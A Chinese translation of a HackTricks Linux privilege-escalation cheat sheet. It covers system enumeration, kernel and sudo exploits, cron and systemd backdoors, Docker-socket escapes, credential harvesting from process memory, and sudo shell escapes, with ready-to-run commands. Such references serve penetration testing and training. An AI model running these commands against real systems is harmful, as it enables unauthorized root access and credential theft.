# Linux 权限提升

<details>

<summary><strong>从零开始学习 AWS 黑客技术，成为</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS 红队专家)</strong></a><strong>！</strong></summary>

支持 HackTricks 的其他方式：

* 如果您希望在 **HackTricks 中看到您的公司广告** 或 **下载 HackTricks 的 PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取 [**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* 发现 [**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们独家的 [**NFTs 集合**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来**分享您的黑客技巧。

</details>

## 系统信息

### 操作系统信息

让我们开始了解正在运行的操作系统
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### 路径

如果你**对 `PATH` 变量内的任何文件夹拥有写权限**，你可能能劫持一些库或二进制文件：
```bash
echo $PATH
```
### 环境信息

环境变量中是否有有趣的信息、密码或API密钥？
```bash
(env || set) 2>/dev/null
```
### 内核漏洞利用

检查内核版本，看是否有可用于提升权限的漏洞。
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
您可以在这里找到一个很好的易受攻击的内核列表和一些已经**编译好的漏洞利用程序**：[https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) 和 [exploitdb sploits](https://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploits)。\
其他您可以找到一些**编译好的漏洞利用程序**的网站包括：[https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries)，[https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

要从该网站提取所有易受攻击的内核版本，您可以执行：
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
可以帮助搜索内核漏洞的工具有：

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)（在受害者机器上执行，仅检查内核 2.x 的漏洞）

始终要**在 Google 中搜索内核版本**，也许你的内核版本在某些内核漏洞文章中有提及，那么你就可以确信这个漏洞是有效的。

### CVE-2016-5195 (DirtyCow)

Linux 权限提升 - Linux 内核 <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo 版本

基于以下链接中出现的易受攻击的 sudo 版本：
```bash
searchsploit sudo
```
你可以使用这个 grep 命令来检查 sudo 版本是否存在漏洞。
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

来自 @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg 签名验证失败

查看 **HTB 的 smasher2 box** 以获取如何利用此漏洞的**示例**
```bash
dmesg 2>/dev/null | grep "signature"
```
### 更多系统枚举
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## 枚举可能的防御措施

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR

ASLR（地址空间布局随机化）是一种安全技术，用于随机化进程的地址空间位置，以此来增加对内存布局的预测难度，从而阻止某些类型的攻击。
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

如果你在一个docker容器内部，你可以尝试从中逃脱：

{% content-ref url="docker-security/" %}
[docker-security](docker-security/)
{% endcontent-ref %}

## 驱动器

检查**什么被挂载和未挂载**，在哪里以及为什么。如果有任何东西未挂载，你可以尝试挂载它并检查私密信息
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## 实用软件

枚举有用的二进制文件
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
还要检查是否**安装了任何编译器**。如果您需要使用某些内核漏洞，这很有用，因为建议在您将要使用它的机器（或类似机器）上编译它。
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### 已安装的易受攻击软件

检查**已安装包和服务的版本**。可能存在一些旧版本的Nagios（例如），可以被利用来提升权限…\
建议手动检查更可疑软件的版本。
```bash
dpkg -l #Debian
rpm -qa #Centos
```
如果您有SSH访问该机器的权限，您也可以使用**openVAS**来检查机器内安装的过时和易受攻击的软件。

{% hint style="info" %}
_请注意，这些命令将显示大量信息，其中大部分可能是无用的，因此建议使用OpenVAS或类似应用程序来检查是否有任何已安装软件版本容易受到已知漏洞的攻击_
{% endhint %}

## 进程

查看**哪些进程**正在执行，并检查是否有任何进程拥有**比它应有的更高权限**（也许是由root执行的tomcat？）
```bash
ps aux
ps -ef
top -n 1
```
请始终检查是否有可能运行的[**electron/cef/chromium 调试器**，您可以利用它来提升权限](electron-cef-chromium-debugger-abuse.md)。**Linpeas** 通过检查进程命令行中的 `--inspect` 参数来检测它们。\
同时**检查你对进程二进制文件的权限**，也许你可以覆盖别人的文件。

### 进程监控

你可以使用像 [**pspy**](https://github.com/DominicBreuker/pspy) 这样的工具来监控进程。这对于识别经常执行或在满足一组要求时执行的易受攻击的进程非常有用。

### 进程内存

一些服务器的服务会在内存中**明文保存凭据**。\
通常你需要**root 权限**来读取属于其他用户的进程的内存，因此这通常在你已经是 root 并且想要发现更多凭据时更有用。\
然而，记住作为普通用户**你可以读取你拥有的进程的内存**。

{% hint style="warning" %}
请注意，现在大多数机器**默认不允许 ptrace**，这意味着你不能转储属于你非特权用户的其他进程。

文件 _**/proc/sys/kernel/yama/ptrace\_scope**_ 控制 ptrace 的可访问性：

* **kernel.yama.ptrace\_scope = 0**：所有进程都可以被调试，只要它们有相同的 uid。这是 ptrace 工作的传统方式。
* **kernel.yama.ptrace\_scope = 1**：只有父进程可以被调试。
* **kernel.yama.ptrace\_scope = 2**：只有管理员可以使用 ptrace，因为它需要 CAP\_SYS\_PTRACE 能力。
* **kernel.yama.ptrace\_scope = 3**：不允许使用 ptrace 跟踪任何进程。一旦设置，需要重启才能再次启用 ptrace。
{% endhint %}

#### GDB

如果你可以访问 FTP 服务的内存（例如），你可以获取堆并在其中搜索凭据。
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB 脚本

{% code title="dump-memory.sh" %}
```bash
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

对于给定的进程ID，**maps 显示内存如何在该进程的**虚拟地址空间内映射；它还显示了**每个映射区域的权限**。**mem** 伪文件**暴露了进程本身的内存**。通过**maps** 文件我们知道哪些**内存区域是可读的**以及它们的偏移量。我们使用这些信息来**定位到 mem 文件并将所有可读区域转储到一个文件中**。
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` 提供对系统**物理**内存的访问，而不是虚拟内存。内核的虚拟地址空间可以使用 /dev/kmem 访问。\
通常，`/dev/mem` 只能被 **root** 和 **kmem** 组读取。
```
strings /dev/mem -n10 | grep -i PASS
```
### Linux版ProcDump

ProcDump是经典的Sysinternals套件中ProcDump工具的Linux重新想象版本。可以在[https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)获取。
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### 工具

要转储进程内存，您可以使用：

* [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
* [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - 您可以手动移除 root 要求并转储您拥有的进程
* 来自 [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) 的脚本 A.5 (需要 root 权限)

### 从进程内存中获取凭证

#### 手动示例

如果您发现认证器进程正在运行：
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
```markdown
你可以转储进程（参见前面的章节，了解不同的转储进程内存的方法）并在内存中搜索凭据：
```
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

工具 [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) 将**从内存和一些**众所周知的文件**中窃取明文凭据**。它需要 root 权限才能正常工作。

| 特性                                               | 进程名称              |
| ------------------------------------------------- | -------------------- |
| GDM 密码 (Kali 桌面, Debian 桌面)                 | gdm-password         |
| Gnome Keyring (Ubuntu 桌面, ArchLinux 桌面)       | gnome-keyring-daemon |
| LightDM (Ubuntu 桌面)                             | lightdm              |
| VSFTPd (活动的 FTP 连接)                          | vsftpd               |
| Apache2 (活动的 HTTP 基本认证会话)                | apache2              |
| OpenSSH (活动的 SSH 会话 - Sudo 使用)             | sshd:                |

#### 搜索正则表达式/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## 计划任务/Cron作业

检查是否有任何计划任务存在漏洞。也许你可以利用一个由root执行的脚本（通配符漏洞？可以修改root使用的文件？使用符号链接？在root使用的目录中创建特定文件？）。
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron 路径

例如，在 _/etc/crontab_ 中你可以找到 PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

（_注意用户 "user" 对 /home/user 有写权限_）

如果在这个 crontab 中 root 用户尝试执行某些命令或脚本而没有设置路径。例如： _\* \* \* \* root overwrite.sh_\
那么，你可以通过使用以下方法获取 root shell：
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron 使用带有通配符的脚本（通配符注入）

如果一个由 root 执行的脚本在命令中包含了“**\***”，你可以利用这一点来做一些意想不到的事情（比如权限提升）。例如：
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**如果通配符前面有路径，如** _**/some/path/\***_ **，则不会受到影响（甚至** _**./\***_ **也不会）。**

阅读以下页面了解更多关于通配符利用的技巧：

{% content-ref url="wildcards-spare-tricks.md" %}
[wildcards-spare-tricks.md](wildcards-spare-tricks.md)
{% endcontent-ref %}

### Cron 脚本覆盖和符号链接

如果你**可以修改由 root 执行的 cron 脚本**，你可以很容易地获取一个 shell：
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
如果由 root 执行的脚本使用了一个**你有完全访问权限的目录**，也许可以删除该文件夹并**创建一个符号链接文件夹指向另一个由你控制的脚本**。
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### 频繁的cron作业

您可以监控进程，搜索每1、2或5分钟执行一次的进程。也许您可以利用它并提升权限。

例如，要**每0.1秒监控一次，持续1分钟**，**按最少执行的命令排序**并删除执行次数最多的命令，您可以执行：
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**您还可以使用** [**pspy**](https://github.com/DominicBreuker/pspy/releases)（这将监控并列出每个启动的进程）。

### 隐形的 cron 作业

可以通过**在注释后加入回车符**（不使用换行符）来创建 cron 作业，该作业将正常工作。示例（注意回车符）：
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## 服务

### 可写的 _.service_ 文件

检查是否可以写入任何 `.service` 文件，如果可以，你**可以修改它**，以便在服务**启动**、**重新启动**或**停止**时（可能需要等到机器重启）**执行**你的**后门**。\
例如，在 .service 文件中创建你的后门，使用 **`ExecStart=/tmp/script.sh`**

### 可写的服务二进制文件

请记住，如果你对服务执行的**二进制文件有写权限**，你可以将它们更改为后门，这样当服务重新执行时，后门将被执行。

### systemd PATH - 相对路径

你可以使用以下命令查看 **systemd** 使用的 PATH：
```bash
systemctl show-environment
```
如果您发现自己可以在路径的任何文件夹中**写入**，您可能能够**提升权限**。您需要搜索服务配置文件中使用的**相对路径**，例如：
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
然后，在你有写权限的systemd PATH文件夹中创建一个**可执行文件**，其**名称与相对路径二进制文件的名称相同**，当服务被要求执行易受攻击的动作（**Start**、**Stop**、**Reload**）时，你的**后门将被执行**（通常非特权用户不能启动/停止服务，但检查你是否可以使用`sudo -l`）。

**通过`man systemd.service`了解更多关于服务的信息。**

## **定时器**

**定时器**是以`**.timer**`结尾的systemd单元文件，它们控制`**.service**`文件或事件。**定时器**可以作为cron的替代品，因为它们内置了对日历时间事件和单调时间事件的支持，并且可以异步运行。

你可以用以下命令枚举所有定时器：
```bash
systemctl list-timers --all
```
### 可写定时器

如果您可以修改定时器，您可以使其执行一些已存在的systemd.unit（如`.service`或`.target`）
```bash
Unit=backdoor.service
```
在文档中，您可以阅读到 Unit 是什么：

> 当这个计时器到期时要激活的单元。参数是一个单元名称，其后缀不是 ".timer"。如果未指定，默认值为与计时器单元同名的服务，除了后缀不同。（见上文。）建议激活的单元名称和计时器单元的名称除了后缀应该相同。

因此，要滥用这个权限，你需要：

* 找到一些 systemd 单元（如 `.service`），它**执行一个可写的二进制文件**
* 找到一些 systemd 单元，它**执行一个相对路径**，并且你对**systemd PATH** 有**可写权限**（以冒充该可执行文件）

**通过 `man systemd.timer` 了解更多关于计时器的信息。**

### **启用计时器**

要启用计时器，你需要 root 权限并执行：
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
请注意，通过在 `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer` 上创建一个符号链接来**激活** **计时器**。

## 套接字

简而言之，Unix 套接字（技术上正确的名称是 Unix 域套接字，**UDS**）允许在同一台机器或不同机器上的两个不同进程之间进行**通信**，用于客户端-服务器应用程序框架。更准确地说，它是使用标准 Unix 描述符文件在计算机之间进行通信的一种方式。（来自[这里](https://www.linux.com/news/what-socket/)）。

套接字可以使用 `.socket` 文件进行配置。

**通过 `man systemd.socket` 了解更多关于套接字的信息。** 在这个文件中，可以配置几个有趣的参数：

* `ListenStream`、`ListenDatagram`、`ListenSequentialPacket`、`ListenFIFO`、`ListenSpecial`、`ListenNetlink`、`ListenMessageQueue`、`ListenUSBFunction`：这些选项不同，但总结起来是用来**指示它将在哪里监听**套接字（AF_UNIX 套接字文件的路径、要监听的 IPv4/6 和/或端口号等）。
* `Accept`：接受一个布尔参数。如果为 **true**，则为每个传入连接**生成一个服务实例**，并且只将连接套接字传递给它。如果为 **false**，则所有监听套接字本身都会**传递给启动的服务单元**，并且为所有连接生成一个服务单元。对于数据报套接字和 FIFO，此值被忽略，单个服务单元无条件处理所有传入流量。**默认为 false**。出于性能原因，建议仅以适用于 `Accept=no` 的方式编写新守护进程。
* `ExecStartPre`、`ExecStartPost`：执行一个或多个命令行，分别在监听**套接字**/FIFOs **创建**和绑定**之前**或**之后**执行。命令行的第一个标记必须是绝对文件名，然后是进程的参数。
* `ExecStopPre`、`ExecStopPost`：在监听**套接字**/FIFOs **关闭**和移除**之前**或**之后**执行的额外**命令**。
* `Service`：指定在**传入流量**时**激活**的**服务**单元名称。此设置仅允许用于 Accept=no 的套接字。它默认为与套接字同名的服务（后缀替换）。在大多数情况下，不需要使用此选项。

### 可写的 .socket 文件

如果你找到一个**可写的** `.socket` 文件，你可以在 `[Socket]` 部分的开头**添加**类似 `ExecStartPre=/home/kali/sys/backdoor` 的内容，然后在创建套接字之前执行后门。因此，你**可能需要等到机器重启。**\
_请注意，系统必须使用该套接字文件配置，否则后门将不会执行_

### 可写的套接字

如果你**发现任何可写的套接字**（_现在我们谈论的是 Unix 套接字，而不是配置 `.socket` 文件_），那么**你可以与该套接字通信**，也许可以利用某个漏洞。

### 枚举 Unix 套接字
```bash
netstat -a -p --unix
```
### 原始连接
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**利用示例：**

{% content-ref url="socket-command-injection.md" %}
[socket-command-injection.md](socket-command-injection.md)
{% endcontent-ref %}

### HTTP 套接字

请注意，可能有一些**套接字在监听 HTTP** 请求（_我指的不是 .socket 文件，而是充当 unix 套接字的文件_）。您可以用以下方法检查：
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
如果套接字**以HTTP请求响应**，那么你可以与之**通信**，并可能**利用某些漏洞**。

### 可写的Docker套接字

**Docker套接字**通常位于`/var/run/docker.sock`，只有`root`用户和`docker`组可以写入。\
如果由于某种原因**你有对该套接字的写权限**，你可以提升权限。\
以下命令可用于提升权限：
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
#### 使用 socket 的 docker web API 而不需要 docker 包

如果你可以访问 **docker socket**，但不能使用 docker 二进制文件（可能连安装都没有），你可以直接使用 `curl` 来操作 web API。

以下命令是如何**创建一个挂载宿主系统根目录的 docker 容器**的示例，并使用 `socat` 在新的 docker 中执行命令。
```bash
# List docker images
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
#[{"Containers":-1,"Created":1588544489,"Id":"sha256:<ImageID>",...}]
# Send JSON to docker API to create the container
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
#{"Id":"<NewContainerID>","Warnings":[]}
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```
最后一步是使用 `socat` 向容器发起连接，发送一个“attach”请求
```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp

#HTTP/1.1 101 UPGRADED
#Content-Type: application/vnd.docker.raw-stream
#Connection: Upgrade
#Upgrade: tcp
```
现在，您可以通过这个 `socat` 连接在容器上执行命令。

### 其他

请注意，如果您因为**在 `docker` 组内**而拥有对docker套接字的写权限，您将有[**更多提升权限的方法**](interesting-groups-linux-pe/#docker-group)。如果[**docker API 在端口上监听**，您也可能能够攻破它](../../network-services-pentesting/2375-pentesting-docker.md#compromising)。

在以下内容中查看**更多从docker中脱逃或滥用它以提升权限的方法**：

{% content-ref url="docker-security/" %}
[docker-security](docker-security/)
{% endcontent-ref %}

## Containerd (ctr) 权限提升

如果您发现可以使用 **`ctr`** 命令，请阅读以下页面，因为**您可能能够滥用它以提升权限**：

{% content-ref url="containerd-ctr-privilege-escalation.md" %}
[containerd-ctr-privilege-escalation.md](containerd-ctr-privilege-escalation.md)
{% endcontent-ref %}

## **RunC** 权限提升

如果您发现可以使用 **`runc`** 命令，请阅读以下页面，因为**您可能能够滥用它以提升权限**：

{% content-ref url="runc-privilege-escalation.md" %}
[runc-privilege-escalation.md](runc-privilege-escalation.md)
{% endcontent-ref %}

## **D-Bus**

D-BUS 是一个**进程间通信（IPC）系统**，提供了一个简单而强大的机制，**允许应用程序相互通信**，传递信息和请求服务。D-BUS 从头开始设计，以满足现代Linux系统的需求。

作为一个全功能的IPC和对象系统，D-BUS 有几个预期用途。首先，D-BUS 可以执行基本的应用程序IPC，允许一个进程将数据传送给另一个进程——想象一下**UNIX域套接字的增强版**。其次，D-BUS 可以促进通过系统发送事件或信号，允许系统中的不同组件通信并最终更好地集成。例如，蓝牙守护进程可以发送来电信号，您的音乐播放器可以拦截它，直到通话结束时将音量静音。最后，D-BUS 实现了一个远程对象系统，允许一个应用程序从不同的对象请求服务和调用方法——想象一下没有复杂性的CORBA。（来源[这里](https://www.linuxjournal.com/article/7744)）。

D-Bus 使用一个**允许/拒绝模型**，其中每个消息（方法调用、信号发射等）都可以根据匹配它的所有策略规则的总和**被允许或拒绝**。策略中的每条规则都应设置 `own`、`send_destination` 或 `receive_sender` 属性。

`/etc/dbus-1/system.d/wpa_supplicant.conf` 的策略部分：
```markup
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
因此，如果策略以任何方式允许您的用户**与总线交互**，您可能能够利用它来提升权限（也许只是列出一些密码？）。

请注意，**不指定**任何用户或组的**策略**会影响所有人（`<policy>`）。\
上下文为"default"的策略影响所有未被其他策略影响的人（`<policy context="default"`）。

**了解如何在这里枚举和利用 D-Bus 通信：**

{% content-ref url="d-bus-enumeration-and-command-injection-privilege-escalation.md" %}
[d-bus-enumeration-and-command-injection-privilege-escalation.md](d-bus-enumeration-and-command-injection-privilege-escalation.md)
{% endcontent-ref %}

## **网络**

枚举网络并确定机器的位置总是很有趣的。

### 通用枚举
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### 开放端口

始终检查在访问机器之前无法与之交互的网络服务：
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### 嗅探

检查是否可以嗅探流量。如果可以，您可能能够抓取一些凭据。
```
timeout 1 tcpdump
```
## 用户

### 通用枚举

检查**你是谁**，你拥有哪些**权限**，系统中有哪些**用户**，哪些用户可以**登录**以及哪些用户拥有**root权限**：
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### 大 UID

某些 Linux 版本受到一个 bug 影响，该 bug 允许 **UID > INT\_MAX** 的用户提升权限。更多信息：[这里](https://gitlab.freedesktop.org/polkit/polkit/issues/74)、[这里](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) 和 [这里](https://twitter.com/paragonsec/status/1071152249529884674)。\
**利用它** 使用：**`systemd-run -t /bin/bash`**

### 用户组

检查你是否是某个可能授予你 root 权限的**用户组成员**：

{% content-ref url="interesting-groups-linux-pe/" %}
[interesting-groups-linux-pe](interesting-groups-linux-pe/)
{% endcontent-ref %}

### 剪贴板

检查剪贴板中是否有可能有趣的内容（如果可能的话）
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### 密码策略
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### 已知密码

如果您**知道环境中的任何密码**，**尝试使用该密码登录每个用户**。

### Su Brute

如果您不介意制造大量噪音，并且计算机上存在`su`和`timeout`二进制文件，您可以尝试使用[su-bruteforce](https://github.com/carlospolop/su-bruteforce)对用户进行暴力破解。\
使用 `-a` 参数的[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)也会尝试对用户进行暴力破解。

## 可写的PATH滥用

### $PATH

如果您发现可以**在$PATH的某个文件夹内写入**，您可能可以通过**在可写文件夹中创建一个后门**来提升权限，该后门的名称是不同用户（理想情况下是root）将要执行的某些命令的名称，并且该命令**不是从位于您的可写文件夹之前**的文件夹中加载的。

### SUDO 和 SUID

您可能被允许使用sudo执行某些命令，或者它们可能具有suid位。使用以下命令检查：
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
一些**意外的命令允许你读取和/或写入文件，甚至执行命令。**例如：
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo 配置可能允许用户在不知道密码的情况下以另一个用户的权限执行某些命令。
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
